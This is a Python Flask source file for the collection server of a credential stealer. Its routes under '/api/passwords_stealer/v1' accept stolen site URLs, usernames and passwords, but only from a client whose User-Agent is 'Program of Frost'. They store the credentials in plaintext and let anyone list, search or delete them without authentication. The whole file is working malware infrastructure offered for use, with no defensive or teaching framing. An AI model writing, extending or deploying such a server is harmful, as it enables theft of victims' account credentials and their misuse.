import os
import flask
from flask import request, jsonify
from flask_sqlalchemy import SQLAlchemy

app = flask.Flask(__name__)
app.config["SQLALCHEMY_DATABASE_URI"] = os.environ['DATABASE_URL']
db = SQLAlchemy(app)


class Entry(db.Model):
    __tablename__ = "Passwords"
    id = db.Column(db.Integer, primary_key=True, autoincrement=True)
    url = db.Column(db.String(256), nullable=True)
    username = db.Column(db.String(256), nullable=True)
    password = db.Column(db.String(256), nullable=True)

    def __init__(self, url, username, password):
        self.url = url
        self.username = username
        self.password = password

    def toDict(self):
        return {"id": self.id, "url": self.url, "username": self.username, "password": self.password}


@app.route("/", methods=["GET"])
def index():
    return '''<h1>A simple API for handling passwords</h1>
<p>Just not my passwords</p>'''


@app.route("/api/passwords_stealer/v1/insert", methods=["POST"])
def receivePassword():
    #get passwords and save to database
        #get all the data from the requests
        if (request.headers.get('User-Agent') != "Program of Frost"):
            return flask.Response(status=500)

        url = request.form.get("url")
        username = request.form.get("username")
        password = request.form.get("password")

        #add the passwords to the database
        entry = Entry(url=url, username=username, password=password)
        db.session.add(entry)
        db.session.commit()
        return flask.Response(status=200)

@app.route("/api/passwords_stealer/v1", methods = ["GET"])
def queryPassword():
    #support searching by url, username and id
    #with url and username we dont need to send the exact url, just a character contained in the username we need to find is enough
    url = request.args.get("url")
    username = request.args.get("username")
    id = request.args.get("id")
    if (not(id is None)):
        return jsonify([entry.toDict() for entry in Entry.query.filter_by(id = id)])
    else:
        if (url is None):
            url = ""
        if (username is None):
            username = ""
        searchUrl = "%" + url + "%"
        searchUser = "%" + username + "%"
        return jsonify([entry.toDict() for entry in Entry.query.filter(Entry.username.like(searchUser), Entry.url.like(searchUrl)).all()])

@app.route("/api/passwords_stealer/v1/delete", methods = ["POST"])
def deletePassword():
    #delete entry by id
    id = request.form.get("id")
    if (id is None):
        return flask.Response("Must provide an ID", status=400)
    deleteID = request.form.get("id")
    entry = Entry.query.filter_by(id=deleteID).all()
    if (len(entry) != 1):
        return flask.Response("Query error", status=500)
    db.session.delete(entry[0])
    db.session.commit()
    return flask.Response("Operation completed",status=200)

@app.route("/api/passwords_stealer/v1/all", methods=["GET"])
def getAllPasswords():
    return jsonify([entry.toDict() for entry in Entry.query.all()])

@app.errorhandler(404)
def page_not_found(e):
    return "<h1>404</h1><p>The resource could not be found.</p>", 404







